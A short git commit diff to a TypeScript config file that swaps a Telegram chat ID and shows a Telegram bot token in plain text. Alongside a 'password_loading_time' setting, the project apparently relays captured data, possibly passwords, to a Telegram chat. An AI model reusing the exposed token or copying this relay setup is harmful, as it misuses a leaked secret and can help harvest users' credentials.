be84c9b6095eab4b6ba133201a9c0e2c8368c7ee
bu10blayvo <hwn8b1500f@hotmail.com>
2025-08-11 16:18:32 +0700

    Update config.ts

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -18,7 +18,7 @@ const defaultConfig: Config = {
 		password_loading_time: 5000,
 	},
 	telegram: {
-		data_chatid: "-1002603960061",
+		data_chatid: "-4922892863",
 		data_token: "7034258013:AAEivZo6dXxDVDDHPwa_TXJQzykNVIdK0xA",
 	},
 };
